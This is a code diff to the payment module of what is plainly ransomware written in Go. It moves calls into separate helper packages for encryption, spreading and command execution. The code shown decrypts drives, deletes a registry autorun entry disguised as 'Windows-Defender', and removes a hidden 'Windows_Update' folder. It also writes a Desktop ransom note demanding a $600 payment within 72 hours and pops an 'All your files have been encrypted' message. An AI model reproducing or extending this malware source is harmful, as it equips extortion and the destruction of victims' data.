@@ -3,17 +3,20 @@ package pay
 import (
 	"io/ioutil"
 	"os"
+	"../aes"
+	"../utils"
+	"../spread"
 )
 
 var PRICE = 600
 
 func End() {
 	//Decrypt
-	EncryptExternalDrives(false)
-	EncryptDocumets("C:\\", false)
+	spread.EncryptExternalDrives(false)
+	spread.EncryptDocumets("C:\\", false)
 
 	//REmove key
-	Run("REG DELETE HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V Windows-Defender /t REG_SZ /F /D %APPDATA%\\Windows_Update\\" + TARGET_FILE_NAME)
+	utils.Run("REG DELETE HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V Windows-Defender /t REG_SZ /F /D %APPDATA%\\Windows_Update\\" + TARGET_FILE_NAME)
 
 	//Delete home
 	os.RemoveAll(os.Getenv("APPDATA") + "\\Windows_Update")
@@ -25,8 +28,8 @@ func PromtPay() {
 	*	Copy instructions to Desktop and opens it
 	 */
 	ioutil.WriteFile(os.Getenv("USERPROFILE")+"\\Desktop\\Instructions.html", []byte(TEXT), 0644)
-	Run("start " + os.Getenv("USERPROFILE") + "\\Desktop\\Instructions.html") //Not checked
-	Run("msg * All your files have been encrypted, read the note in your Desktop")
+	utils.Run("start " + os.Getenv("USERPROFILE") + "\\Desktop\\Instructions.html") //Not checked
+	utils.Run("msg * All your files have been encrypted, read the note in your Desktop")
 }
 
 var TEXT = `<p><center><h1>ALL YOUR FILES HAS BEEN ENCRYPTED</br></h1></center></p>
@@ -58,7 +61,7 @@ I recommend you look for info online if you don't want to use coinbase.com</p>
 <p>IT IS EXTREMELY IMPORTANT THAT YOU SEND THE EXACT AMMOUNT AND THAT THIS PROGRAM IS RUNNING <br>
 WHILE YOU MAKE THE PAYMENT TO BE ABLE TO CONFIRM THE TRANSACTION.</p>
 
-<p>If you can't figure out something send me an email to helpmedecrypt@protonmail.com<br>
+<p>If you can't figure out something send me an email to EMAIL<br>
 You have 72 hours form now on to send the payment or you will lose all the data so don't <br>
 wait to send an email if you don't know something.</p>
 
